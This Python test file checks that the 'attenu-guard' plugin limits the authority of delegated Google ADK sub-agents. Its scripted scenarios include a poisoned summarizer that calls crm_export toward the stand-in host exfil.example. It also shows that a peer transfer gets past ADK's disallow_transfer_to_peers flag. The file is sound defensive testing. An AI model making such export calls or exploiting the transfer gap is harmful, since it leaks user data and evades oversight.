"""
Integration test: attenu-guard x Google ADK (google-adk 2.7.1).

Runs entirely offline: the model is a `google.adk.models.BaseLlm` subclass that
yields scripted `LlmResponse`s containing function calls, so the real
`google.adk.runners.Runner` drives the whole scenario with no API key.

What is asserted is the *user-felt* outcome, not the internals: a sub-agent that
was delegated narrow authority tries to exfiltrate, and the tool body is proven
never to have run (via the side-effect list the tool would have appended to).

The test drives the SHIPPED example (`examples/integrations/google_adk/demo.py`
+ `attenu_guard.adapters.google_adk`), so a green run also proves the example works.

It additionally pins the ADK behaviour the integration exists to compensate for:
`disallow_transfer_to_peers=True` does NOT stop a peer transfer on ADK 2.7.1's
default execution path (google/adk/workflow/utils/_transfer_utils.py has no
`disallow_transfer_*` check at all), while the attenu-guard chain attenuates
the peer's authority anyway.
"""
from __future__ import annotations

import asyncio
import importlib.util
import sys
from pathlib import Path

import pytest

pytest.importorskip("google.adk")

from google.adk.agents.llm_agent import LlmAgent  # noqa: E402
from google.adk.apps.app import App  # noqa: E402
from google.adk.runners import Runner  # noqa: E402
from google.adk.sessions.in_memory_session_service import (  # noqa: E402
    InMemorySessionService,
)
from google.adk.plugins.base_plugin import BasePlugin  # noqa: E402
from google.adk.tools.agent_tool import AgentTool  # noqa: E402
from google.adk.tools.long_running_tool import LongRunningFunctionTool  # noqa: E402
from google.genai import types  # noqa: E402

from attenu_guard import (  # noqa: E402
    AuditLog,
    Authority,
    AuthorityDenied,
    EgressRank,
    Guard,
    ReasonCode,
    RowLimit,
)
from attenu_guard.reasons import BodyState, Capture  # noqa: E402

# --------------------------------------------------------------------------
# Load the example modules by path.
#
# NOTE: we deliberately do NOT put `examples/integrations/` on sys.path — the
# example directory is itself named `google_adk`, and adding its parent could
# shadow a real package. Loading by file location with an explicit module name
# avoids that entirely.
# --------------------------------------------------------------------------
_EXAMPLE_DIR = Path(__file__).resolve().parents[2] / "examples" / "integrations" / "google_adk"


def _load(name: str):
    spec = importlib.util.spec_from_file_location(name, _EXAMPLE_DIR / f"{name}.py")
    assert spec and spec.loader, f"cannot load {name} from {_EXAMPLE_DIR}"
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod  # so `demo` can `import dg_google_adk`
    spec.loader.exec_module(mod)
    return mod


import attenu_guard.adapters.google_adk as dg_adk
demo = _load("demo")


# --------------------------------------------------------------------------
# The scenario's authority model (mirrors demo.py).
# --------------------------------------------------------------------------
ROOT_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)
SUMMARIZER_REQUEST = Authority(
    scopes={"crm.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")],
    ttl=900,
)


def _fc(name: str, **args) -> types.Part:
    return types.Part.from_function_call(name=name, args=args)


def _text(t: str) -> types.Part:
    return types.Part.from_text(text=t)


# --------------------------------------------------------------------------
# Helpers to drive a Runner turn and read what happened.
# --------------------------------------------------------------------------
async def _drive(runner: Runner, session, message: str) -> list:
    events = []
    async for event in runner.run_async(
        user_id=session.user_id,
        session_id=session.id,
        new_message=types.Content(role="user", parts=[_text(message)]),
    ):
        events.append(event)
    return events


def _function_responses(events) -> dict:
    """{tool_name: response_dict} for every function response in the turn."""
    out = {}
    for event in events:
        if not (event.content and event.content.parts):
            continue
        for part in event.content.parts:
            if part.function_response:
                out[part.function_response.name] = part.function_response.response
    return out


def _build(scripts: dict, *, plugin_kwargs=None, tools=None, issue_kwargs=None):
    """Build the orchestrator/summarizer tree from demo.py with a scripted model."""
    calls: list = []
    model = demo.ScriptedLlm(script=scripts)
    summarizer = LlmAgent(
        name="summarizer",
        model=model,
        description="Summarizes CRM data.",
        instruction="Summarize the Q3 pipeline.",
        tools=tools if tools is not None else [demo.make_crm_query(calls), demo.make_crm_export(calls)],
    )
    orchestrator = LlmAgent(
        name="orchestrator",
        model=model,
        description="Routes work to specialists.",
        instruction="Delegate to the summarizer.",
        sub_agents=[summarizer],
    )
    root_guard = Guard.issue("orchestrator", ROOT_AUTHORITY, task="quarterly review",
                             **(issue_kwargs or {}))
    kwargs = {
        "root_agent_name": "orchestrator",
        "delegations": {"summarizer": SUMMARIZER_REQUEST},
        "tools": demo.TOOL_AUTHORITIES,
    }
    kwargs.update(plugin_kwargs or {})
    plugin = dg_adk.DelegationGuardPlugin(root_guard, **kwargs)
    app = App(name="dg-adk-test", root_agent=orchestrator, plugins=[plugin])
    session_service = InMemorySessionService()
    runner = Runner(app=app, session_service=session_service)
    return runner, session_service, root_guard, plugin, calls


# ==========================================================================
# 1. The canonical poisoned-summarizer story, end to end through Runner.
# ==========================================================================
def test_poisoned_export_is_denied_before_the_tool_body_runs():
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build({
            "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
            "summarizer": [
                _fc("crm_query", rows=4200),
                _fc("crm_export", destination="https://exfil.example/drop"),
                _text("Q3 pipeline summarized."),
            ],
        })
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        events = await _drive(runner, session, "summarize the Q3 pipeline")
        return events, root_guard, plugin, calls

    events, root_guard, plugin, calls = asyncio.run(scenario())

    # (a) the in-authority read executed for real...
    assert ("crm_query", 4200) in calls
    # (b) ...and the out-of-authority export NEVER reached its body.
    assert not any(name == "crm_export" for name, _ in calls), calls

    # The model was told why, deterministically, as a tool result.
    responses = _function_responses(events)
    assert "crm_export" in responses, "no function response was produced for crm_export"
    denial = responses["crm_export"]
    assert denial.get("error") == "authority_denied"
    assert ReasonCode.SCOPE_NOT_GRANTED in denial.get("reasons", [])

    # The audit log is intact and records the denial with a machine-readable code.
    entries = root_guard.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, err
    denies = [e for e in entries if e["event"] == "deny"]
    assert any(
        e["tool"] == "crm_export" and e["reason"] == ReasonCode.SCOPE_NOT_GRANTED
        for e in denies
    ), denies
    allows = [e for e in entries if e["event"] == "allow"]
    assert any(e["tool"] == "crm_query" for e in allows), allows


# ==========================================================================
# 2. A ceiling denial (not just a scope denial) also stops the body.
# ==========================================================================
def test_row_ceiling_denies_an_oversized_read():
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build({
            "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
            "summarizer": [
                _fc("crm_query", rows=50_000),   # > RowLimit(5_000) granted to the child
                _text("done"),
            ],
        })
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        return await _drive(runner, session, "read everything"), root_guard, calls

    events, root_guard, calls = asyncio.run(scenario())

    assert calls == [], f"tool body ran despite the ceiling: {calls}"
    denial = _function_responses(events)["crm_query"]
    assert denial["error"] == "authority_denied"
    assert ReasonCode.CEILING_EXCEEDED in denial["reasons"]


# ==========================================================================
# 3. Cascade revocation: after revoke(), every later call from that subtree
#    is denied — the agent keeps running, it just cannot act.
# ==========================================================================
def test_revocation_denies_every_later_tool_call():
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build({
            "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
            "summarizer": [
                _fc("crm_query", rows=100),
                _text("first turn done"),
                # second turn, after revocation:
                _fc("crm_query", rows=100),
                _text("second turn done"),
            ],
        })
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        await _drive(runner, session, "turn one")
        assert ("crm_query", 100) in calls, "setup: the first read should have run"

        summarizer_node = plugin.guard_for("summarizer").node_id
        revoked = root_guard.revoke(summarizer_node)

        calls.clear()
        events = await _drive(runner, session, "turn two")
        return events, root_guard, revoked, summarizer_node, calls

    events, root_guard, revoked, node_id, calls = asyncio.run(scenario())

    assert node_id in revoked
    assert calls == [], f"a revoked agent still executed a tool body: {calls}"
    denial = _function_responses(events)["crm_query"]
    assert ReasonCode.REVOKED in denial["reasons"]

    ok, err = AuditLog.verify(root_guard.audit_log().entries)
    assert ok, err


# ==========================================================================
# 4. Structural guarantee: the minted child is provably narrower, and a
#    delegation asking for MORE than the parent holds is met down, not up.
# ==========================================================================
def test_child_guard_is_provably_narrower_and_cannot_be_widened():
    async def scenario():
        greedy = Authority(
            scopes={"crm.*", "mail.send", "admin.root"},      # asks for far more
            ceilings=[RowLimit(10_000_000), EgressRank("any")],
            ttl=999_999,
        )
        runner, sessions, root_guard, plugin, calls = _build(
            {
                "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
                "summarizer": [_text("hi")],
            },
        )
        # Re-mint the plugin's delegation table with the greedy request.
        plugin._delegations["summarizer"] = greedy  # noqa: SLF001 (test-only)
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        await _drive(runner, session, "go")
        return root_guard, plugin

    root_guard, plugin = asyncio.run(scenario())
    child = plugin.guard_for("summarizer")

    assert child.is_narrower_than(root_guard)
    assert child.authority.is_narrower_than(root_guard.authority)
    # The greedy asks were met down, never granted.
    assert "admin.root" not in child.authority.scopes
    assert child.authority.ceiling("max_rows").max_rows == 100_000   # parent's cap
    assert child.authority.ttl == 3600                               # parent's ttl
    # ...and the widened request is still denied at check() time.
    assert not child.would_allow("admin.root")


# ==========================================================================
# 5. The AgentTool (agent-as-tool) delegation primitive is covered too.
# ==========================================================================
def test_agent_tool_delegation_is_guarded():
    async def scenario():
        calls: list = []
        model = demo.ScriptedLlm(script={
            "orchestrator": [
                _fc("summarizer", request="summarize Q3"),
                _text("orchestrator done"),
            ],
            "summarizer": [
                _fc("crm_query", rows=4200),
                _fc("crm_export", destination="https://exfil.example/drop"),
                _text("summary"),
            ],
        })
        summarizer = LlmAgent(
            name="summarizer", model=model, description="Summarizes CRM data.",
            tools=[demo.make_crm_query(calls), demo.make_crm_export(calls)],
        )
        orchestrator = LlmAgent(
            name="orchestrator", model=model, description="Routes work.",
            tools=[AgentTool(agent=summarizer)],
        )
        root_guard = Guard.issue("orchestrator", ROOT_AUTHORITY, task="quarterly review")
        plugin = dg_adk.DelegationGuardPlugin(
            root_guard,
            root_agent_name="orchestrator",
            delegations={"summarizer": SUMMARIZER_REQUEST},
            tools=demo.TOOL_AUTHORITIES,
        )
        app = App(name="dg-adk-agenttool", root_agent=orchestrator, plugins=[plugin])
        sessions = InMemorySessionService()
        runner = Runner(app=app, session_service=sessions)
        session = await sessions.create_session(app_name="dg-adk-agenttool", user_id="u")
        await _drive(runner, session, "go")
        return root_guard, plugin, calls

    root_guard, plugin, calls = asyncio.run(scenario())

    assert ("crm_query", 4200) in calls
    assert not any(name == "crm_export" for name, _ in calls), calls
    assert plugin.guard_for("summarizer").is_narrower_than(root_guard)


# ==========================================================================
# 6. Fail-closed: a tool with no declared Authority is denied, not allowed.
# ==========================================================================
def test_undeclared_tool_is_denied_by_default():
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build({
            "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
            "summarizer": [_fc("crm_export", destination="x"), _text("done")],
        }, plugin_kwargs={"tools": {}})   # nothing declared at all
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        return await _drive(runner, session, "go"), calls

    events, calls = asyncio.run(scenario())
    assert calls == []
    assert _function_responses(events)["crm_export"]["error"] == "authority_denied"


# ==========================================================================
# 6b. Slice 1 / Plan A: a denial says WHY — held (waiting on a human) vs
#     unresolved (no authority known) vs out_of_authority (over-reach) — on
#     the ledger AND in the dict handed back to the model.
# ==========================================================================
def test_denial_carries_disposition_held_vs_unresolved_vs_out_of_authority():
    from attenu_guard import Disposition

    def run(tools):
        async def scenario():
            runner, sessions, root_guard, plugin, calls = _build({
                "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
                "summarizer": [_fc("crm_export", destination="x"), _text("done")],
            }, plugin_kwargs={"tools": tools})
            session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
            return await _drive(runner, session, "go"), root_guard
        events, root_guard = asyncio.run(scenario())
        resp = _function_responses(events)["crm_export"]
        led = [e for e in root_guard.audit_log().entries if e["event"] == "deny" and e.get("tool") == "crm_export"][-1]
        return resp, led

    # declared, and the authority source says it is HELD pending an operator grant
    resp, led = run({"crm_export": dg_adk.ToolAuthority("crm.export", lambda a: {"egress": "any"},
                                                        disposition=Disposition.HELD_PENDING_GRANT)})
    assert resp["error"] == "authority_denied" and resp["disposition"] == "held_pending_grant"
    assert led["disposition"] == "held_pending_grant"
    # declared, nothing stated: the shim's own truth — the summarizer does not hold crm.export
    resp, led = run({"crm_export": dg_adk.ToolAuthority("crm.export", lambda a: {"egress": "any"})})
    assert resp["disposition"] == "out_of_authority" and led["disposition"] == "out_of_authority"
    # not declared at all: no authority known for the tool
    resp, led = run({})
    assert resp["disposition"] == "unresolved" and led["disposition"] == "unresolved"


# ==========================================================================
# 6c. A transfer BACK to an ancestor is control flow returning up, not a new
#     delegation: it must not be checked as agent.delegate.<ancestor> (found
#     live on travel-concierge, 2026-08-19) — and the child is marked done.
# ==========================================================================
def test_transfer_back_to_the_parent_is_a_return_not_a_delegation():
    async def scenario():
        calls: list = []
        model = demo.ScriptedLlm(script={
            "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer"), _text("thanks")],
            "summarizer": [_fc("crm_query", rows=4), _fc("transfer_to_agent", agent_name="orchestrator"), _text("back")],
        })
        summarizer = LlmAgent(name="summarizer", model=model, description="Summarizes CRM data.",
                              tools=[demo.make_crm_query(calls), demo.make_crm_export(calls)])
        orchestrator = LlmAgent(name="orchestrator", model=model, description="Routes work.", sub_agents=[summarizer])
        root_guard = Guard.issue("orchestrator", Authority(scopes={"crm.*", "mail.send", "agent.delegate.summarizer"},
                                                           ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600), task="root")
        plugin = dg_adk.DelegationGuardPlugin(root_guard, root_agent_name="orchestrator", delegations={"summarizer": SUMMARIZER_REQUEST},
                                              tools=demo.TOOL_AUTHORITIES, delegation_scope="agent.delegate")
        app = App(name="dg-adk-ret", root_agent=orchestrator, plugins=[plugin])
        sessions = InMemorySessionService(); runner = Runner(app=app, session_service=sessions)
        session = await sessions.create_session(app_name="dg-adk-ret", user_id="u")
        return await _drive(runner, session, "go"), root_guard, plugin
    events, root_guard, plugin = asyncio.run(scenario())
    ents = root_guard.audit_log().entries
    denies = [e for e in ents if e["event"] == "deny"]
    assert not [d for d in denies if d.get("scope") == "agent.delegate.orchestrator"], "a return to the parent must not be denied as a delegation"
    spawns = [e for e in ents if e["event"] == "spawn"]
    assert [e["agent"] for e in spawns] == ["summarizer"]                              # one real delegation, no 'orchestrator' child
    done = [e for e in ents if e["event"] == "done" and e.get("agent") == "summarizer"]
    assert done, "the child that hands control back is marked done"
    assert plugin.guard_for("orchestrator") is root_guard


# ==========================================================================
# 7. raise_on_deny=True is the hard-stop variant.
# ==========================================================================
def test_raise_on_deny_aborts_the_run():
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build({
            "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
            "summarizer": [_fc("crm_export", destination="x"), _text("done")],
        }, plugin_kwargs={"raise_on_deny": True})
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        await _drive(runner, session, "go")

    with pytest.raises((AuthorityDenied, RuntimeError)) as exc:
        asyncio.run(scenario())
    # ADK's PluginManager re-wraps plugin exceptions; the cause survives.
    chain, err = [], exc.value
    while err is not None:
        chain.append(type(err))
        err = err.__cause__
    assert AuthorityDenied in chain, chain


# ==========================================================================
# 8. Evidence pin — ADK's own sub-agent restriction is prompt-only on the
#    default 2.7.1 path, and the guard chain contains the escalation anyway.
#
#    This is the claim attenu-guard's README makes about
#    https://github.com/google/adk-python/issues/3850 (closed, but the peer
#    transfer still succeeds here). If a future ADK enforces the flag in code
#    this test goes red — which is the point: it is a pin, not a wish.
# ==========================================================================
def test_disallow_transfer_to_peers_is_not_enforced_but_authority_still_attenuates():
    async def scenario():
        calls: list = []
        model = demo.ScriptedLlm(script={
            "root": [_fc("transfer_to_agent", agent_name="analyst")],
            # `analyst` names its PEER even though disallow_transfer_to_peers=True.
            "analyst": [_fc("transfer_to_agent", agent_name="exporter")],
            "exporter": [_fc("crm_export", destination="https://exfil.example"), _text("x")],
        })
        analyst = LlmAgent(
            name="analyst", model=model, description="Analyst",
            disallow_transfer_to_peers=True,
        )
        exporter = LlmAgent(
            name="exporter", model=model, description="Exporter",
            disallow_transfer_to_peers=True,
            tools=[demo.make_crm_export(calls)],
        )
        root = LlmAgent(name="root", model=model, description="Root",
                        sub_agents=[analyst, exporter])
        root_guard = Guard.issue("root", ROOT_AUTHORITY, task="root")
        plugin = dg_adk.DelegationGuardPlugin(
            root_guard,
            root_agent_name="root",
            delegations={
                "analyst": SUMMARIZER_REQUEST,
                # exporter's own declared ask is broad — but it is reached VIA
                # analyst, so the meet with analyst's narrow authority governs.
                "exporter": Authority(scopes={"crm.*"},
                                      ceilings=[RowLimit(100_000), EgressRank("any")],
                                      ttl=3600),
            },
            tools=demo.TOOL_AUTHORITIES,
        )
        app = App(name="dg-adk-peer", root_agent=root, plugins=[plugin])
        sessions = InMemorySessionService()
        runner = Runner(app=app, session_service=sessions)
        session = await sessions.create_session(app_name="dg-adk-peer", user_id="u")
        events = await _drive(runner, session, "go")
        return events, root_guard, plugin, calls

    events, root_guard, plugin, calls = asyncio.run(scenario())

    # (a) ADK let the peer transfer through despite disallow_transfer_to_peers=True.
    assert any(e.actions.transfer_to_agent == "exporter" for e in events), \
        "ADK 2.7.1 no longer allows the peer transfer — issue #3850 appears fixed"
    assert any(e.author == "exporter" for e in events)

    # (b) attenu-guard contained it: exporter's authority is the meet with
    #     analyst's, so the export it was nominally allowed is denied.
    exporter_guard = plugin.guard_for("exporter")
    analyst_guard = plugin.guard_for("analyst")
    assert exporter_guard.is_narrower_than(analyst_guard)
    assert exporter_guard.is_narrower_than(root_guard)
    assert calls == [], f"the escalated peer still exported: {calls}"
    assert _function_responses(events)["crm_export"]["error"] == "authority_denied"


# ==========================================================================
# 9. ADK 2.x `mode='task'` sub-agents: the delegation FC is dispatched at
#    google/adk/workflow/_llm_agent_wrapper.py:483-485 (`_dispatch_task_fc`),
#    OUTSIDE handle_function_calls_async — so no before_tool_callback fires for
#    the hand-off itself. `before_agent_callback` still does, which is why the
#    guard is minted there. This test pins both halves of that claim.
# ==========================================================================
def test_task_mode_subagent_is_still_guarded():
    seen_tools: list[str] = []

    class _Spy(dg_adk.DelegationGuardPlugin):
        async def before_tool_callback(self, *, tool, tool_args, tool_context):
            seen_tools.append(tool.name)
            return await super().before_tool_callback(
                tool=tool, tool_args=tool_args, tool_context=tool_context
            )

    async def scenario():
        calls: list = []
        model = demo.ScriptedLlm(script={
            "orchestrator": [_fc("summarizer", request="summarize Q3"), _text("done")],
            "summarizer": [
                _fc("crm_query", rows=4200),
                _fc("crm_export", destination="https://exfil.example"),
                _text("summary"),
            ],
        })
        summarizer = LlmAgent(
            name="summarizer", model=model, description="Summarizes CRM data.",
            mode="task",
            tools=[demo.make_crm_query(calls), demo.make_crm_export(calls)],
        )
        orchestrator = LlmAgent(
            name="orchestrator", model=model, description="Routes work.",
            sub_agents=[summarizer],
        )
        root_guard = Guard.issue("orchestrator", ROOT_AUTHORITY, task="quarterly review")
        plugin = _Spy(
            root_guard,
            root_agent_name="orchestrator",
            delegations={"summarizer": SUMMARIZER_REQUEST},
            tools=demo.TOOL_AUTHORITIES,
        )
        app = App(name="dg-adk-task", root_agent=orchestrator, plugins=[plugin])
        sessions = InMemorySessionService()
        runner = Runner(app=app, session_service=sessions)
        session = await sessions.create_session(app_name="dg-adk-task", user_id="u")
        return await _drive(runner, session, "go"), root_guard, plugin, calls

    events, root_guard, plugin, calls = asyncio.run(scenario())

    # ADK never routes the task hand-off through a tool callback...
    assert "summarizer" not in seen_tools, seen_tools
    # ...but before_agent_callback fired, so the child Guard exists and is narrower.
    assert plugin.guard_for("summarizer").is_narrower_than(root_guard)
    # ...and the sub-agent's own tools are still gated.
    assert ("crm_query", 4200) in calls
    assert not any(name == "crm_export" for name, _ in calls), calls


# ==========================================================================
# 10. `delegation_scope` — the code-enforced hand-off gate ADK does not have.
#     With it set, the transfer itself is authorized against the *delegating*
#     agent's authority, so an undeclared hand-off is refused outright rather
#     than merely attenuated.
# ==========================================================================
def test_delegation_scope_gates_the_handoff_itself():
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build(
            {
                "orchestrator": [
                    _fc("transfer_to_agent", agent_name="summarizer"),
                    _text("orchestrator done"),
                ],
                "summarizer": [_fc("crm_query", rows=10), _text("done")],
            },
            plugin_kwargs={"delegation_scope": "agent.transfer"},
        )
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        return await _drive(runner, session, "go"), root_guard, calls

    events, root_guard, calls = asyncio.run(scenario())

    # The orchestrator holds {crm.*, mail.send} — not `agent.transfer.summarizer` —
    # so the hand-off is refused and the sub-agent never runs at all.
    denial = _function_responses(events)["transfer_to_agent"]
    assert denial["error"] == "authority_denied"
    assert denial["scope"] == "agent.transfer.summarizer"
    assert ReasonCode.SCOPE_NOT_GRANTED in denial["reasons"]
    assert not any(e.author == "summarizer" for e in events)
    assert calls == []


def test_delegation_scope_allows_a_granted_handoff():
    async def scenario():
        calls: list = []
        model = demo.ScriptedLlm(script={
            "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer"),
                             _text("done")],
            "summarizer": [_fc("crm_query", rows=10), _text("done")],
        })
        summarizer = LlmAgent(
            name="summarizer", model=model, description="Summarizes CRM data.",
            tools=[demo.make_crm_query(calls), demo.make_crm_export(calls)],
        )
        orchestrator = LlmAgent(
            name="orchestrator", model=model, description="Routes work.",
            sub_agents=[summarizer],
        )
        # Root authority now also grants the hand-off scope.
        root_guard = Guard.issue("orchestrator", Authority(
            scopes={"crm.*", "mail.send", "agent.transfer.*"},
            ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600), task="root")
        plugin = dg_adk.DelegationGuardPlugin(
            root_guard,
            root_agent_name="orchestrator",
            delegations={"summarizer": SUMMARIZER_REQUEST},
            tools=demo.TOOL_AUTHORITIES,
            delegation_scope="agent.transfer",
        )
        app = App(name="dg-adk-gate", root_agent=orchestrator, plugins=[plugin])
        sessions = InMemorySessionService()
        runner = Runner(app=app, session_service=sessions)
        session = await sessions.create_session(app_name="dg-adk-gate", user_id="u")
        return await _drive(runner, session, "go"), calls

    events, calls = asyncio.run(scenario())
    assert any(e.author == "summarizer" for e in events)
    assert ("crm_query", 10) in calls


# ==========================================================================
# 12. OBSERVE-MODE hooks for sampling (attenu-derive P1 recorder): an undeclared
#     tool / an undeclared sub-agent get a GENERATED ToolAuthority / Authority so
#     every call is authorized-and-RECORDED on the audit log with the generated
#     scope + context, instead of denied (the fail-closed default). Deny stays
#     the default without the hooks (test 6). The AgentTool `request` becomes
#     the child's task text on the spawn record (it was "delegated to <name>").
# ==========================================================================
def test_observe_mode_hooks_record_undeclared_tools_and_agents():
    from attenu_guard.adapters.google_adk import ToolAuthority

    async def scenario():
        calls: list = []
        model = demo.ScriptedLlm(script={
            "orchestrator": [_fc("summarizer", request="summarize the Q3 pipeline"), _text("done")],
            "summarizer": [_fc("crm_query", rows=42), _text("summary")],
        })
        summarizer = LlmAgent(name="summarizer", model=model, description="Summarizes.",
                              tools=[demo.make_crm_query(calls)])
        orchestrator = LlmAgent(name="orchestrator", model=model, description="Routes.",
                                tools=[AgentTool(agent=summarizer)])
        observe = Authority(scopes={"observe.*", "agent.delegate.*"}, ceilings=[], ttl=None)
        root_guard = Guard.issue("orchestrator", observe, task="sample")
        plugin = dg_adk.DelegationGuardPlugin(
            root_guard, root_agent_name="orchestrator",
            delegations={}, tools={},                                    # NOTHING declared...
            default_tool_authority=lambda name: ToolAuthority(f"observe.{name}", lambda a: {"rows_bucket": "10-100"}),
            default_delegation=lambda name: observe,                     # ...but observe hooks generate it
            delegation_scope="agent.delegate",
        )
        app = App(name="dg-adk-observe", root_agent=orchestrator, plugins=[plugin])
        sessions = InMemorySessionService()
        runner = Runner(app=app, session_service=sessions)
        session = await sessions.create_session(app_name="dg-adk-observe", user_id="u")
        events = await _drive(runner, session, "go")
        return events, root_guard, plugin, calls

    events, root_guard, plugin, calls = asyncio.run(scenario())
    assert ("crm_query", 42) in calls                                        # the undeclared tool RAN (observe, not deny)
    entries = root_guard.audit_log().entries
    checks = [e for e in entries if e.get("event") in ("allow", "deny") and e.get("tool") == "crm_query"]
    assert checks and checks[-1]["scope"] == "observe.crm_query" and checks[-1]["event"] == "allow"
    assert checks[-1].get("context", {}).get("rows_bucket") == "10-100"      # generated context lands on the record
    spawns = [e for e in entries if e.get("event") == "spawn"]
    assert spawns and spawns[-1]["task"] == "summarize the Q3 pipeline"      # the AgentTool request is the child's task text
    assert "summarizer" in plugin.guards
    handoff = [e for e in entries if e.get("event") in ("allow", "deny") and e.get("scope") == "agent.delegate.summarizer"]
    assert handoff and handoff[-1]["event"] == "allow"                       # the hand-off itself is recorded


# ==========================================================================
# 13. PARALLEL delegations: one model turn issues several AgentTool calls;
#     ADK runs them concurrently. "Parent = the last active agent" then chains
#     the children (child 2 minted from child 1) instead of fanning them out
#     from the delegating agent. Found by attenu-derive sampling (fd, task 1:
#     researcher <- security_reviewer <- test_analyst <- api_surveyor). Safe
#     direction (authority only shrinks) but the wrong topology. The parent of
#     an AgentTool / transfer target is the agent that ISSUED the call.
# ==========================================================================
def test_parallel_agent_tool_calls_fan_out_from_the_delegating_agent():
    async def scenario():
        calls: list = []
        model = demo.ScriptedLlm(script={
            "orchestrator": [types.Part.from_function_call(name="analyst", args={"request": "a"}), _text("done")],   # placeholder, replaced below
        })
        # one AssistantMessage with TWO function calls -> ADK dispatches them concurrently
        class TwoCallsLlm(demo.ScriptedLlm):
            async def generate_content_async(self, llm_request, stream=False):
                labels = (llm_request.config.labels or {}) if llm_request.config else {}
                agent = labels.get(demo._AGENT_LABEL)
                if agent == "orchestrator" and not getattr(self, "_fired", False):
                    self._fired = True
                    yield demo.LlmResponse(content=types.Content(role="model", parts=[
                        types.Part.from_function_call(name="analyst", args={"request": "analyse"}),
                        types.Part.from_function_call(name="reviewer", args={"request": "review"})]))
                    return
                yield demo.LlmResponse(content=types.Content(role="model", parts=[_text(f"[{agent}] finished.")]))
        model = TwoCallsLlm(script={})
        analyst = LlmAgent(name="analyst", model=model, description="A", tools=[demo.make_crm_query(calls)])
        reviewer = LlmAgent(name="reviewer", model=model, description="R", tools=[demo.make_crm_query(calls)])
        orchestrator = LlmAgent(name="orchestrator", model=model, description="O",
                                tools=[AgentTool(agent=analyst), AgentTool(agent=reviewer)])
        root_guard = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
        plugin = dg_adk.DelegationGuardPlugin(
            root_guard, root_agent_name="orchestrator",
            delegations={"analyst": SUMMARIZER_REQUEST, "reviewer": SUMMARIZER_REQUEST}, tools=demo.TOOL_AUTHORITIES)
        app = App(name="dg-adk-parallel", root_agent=orchestrator, plugins=[plugin])
        sessions = InMemorySessionService(); runner = Runner(app=app, session_service=sessions)
        session = await sessions.create_session(app_name="dg-adk-parallel", user_id="u")
        await _drive(runner, session, "go")
        return root_guard, plugin

    root_guard, plugin = asyncio.run(scenario())
    spawns = {e["agent"]: e for e in root_guard.audit_log().entries if e.get("event") == "spawn"}
    assert set(spawns) == {"analyst", "reviewer"}
    root_node = root_guard.node_id
    assert spawns["analyst"]["parent"] == root_node and spawns["reviewer"]["parent"] == root_node, \
        {k: v["parent"] for k, v in spawns.items()}                       # fan-out from the orchestrator, not a chain
    assert spawns["analyst"]["task"] == "analyse" and spawns["reviewer"]["task"] == "review"


def test_delegation_lifecycle_end_is_recorded_when_the_child_returns():
    """`done` on the ledger when an AgentTool child returns to its caller (per-node truncation accounting downstream)."""
    async def scenario():
        calls: list = []
        model = demo.ScriptedLlm(script={"orchestrator": [_fc("summarizer", request="q"), _text("done")], "summarizer": [_fc("crm_query", rows=4), _text("s")]})
        summarizer = LlmAgent(name="summarizer", model=model, description="S", tools=[demo.make_crm_query(calls)])
        orchestrator = LlmAgent(name="orchestrator", model=model, description="O", tools=[AgentTool(agent=summarizer)])
        root_guard = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
        plugin = dg_adk.DelegationGuardPlugin(root_guard, root_agent_name="orchestrator", delegations={"summarizer": SUMMARIZER_REQUEST}, tools=demo.TOOL_AUTHORITIES)
        app = App(name="dg-adk-done", root_agent=orchestrator, plugins=[plugin])
        sessions = InMemorySessionService(); runner = Runner(app=app, session_service=sessions)
        session = await sessions.create_session(app_name="dg-adk-done", user_id="u")
        await _drive(runner, session, "go")
        return root_guard, plugin
    root_guard, plugin = asyncio.run(scenario())
    dones = [e for e in root_guard.audit_log().entries if e.get("event") == "done"]
    assert [e["agent"] for e in dones] == ["summarizer"] and plugin.guard_for("summarizer").is_complete


# ==========================================================================
# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
# ==========================================================================
def _make_crm_query_boom():
    def crm_query(rows: int) -> dict:
        """Raises instead of returning."""
        raise ValueError("boom")

    return crm_query


def test_v2_allowed_tool_call_records_a_returned_outcome():
    async def scenario():
        runner, sessions, root_guard, plugin, calls = _build(
            {
                "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
                "summarizer": [_fc("crm_query", rows=10), _text("done")],
            },
            issue_kwargs={"schema_version": 2},
            plugin_kwargs={"strict_single_hook": True},
        )
        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
        await _drive(runner, session, "go")
        return root_guard

    root_guard = asyncio.run(scenario())
    entries = root_guard.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.FRAMEWORK_POST_HOOK
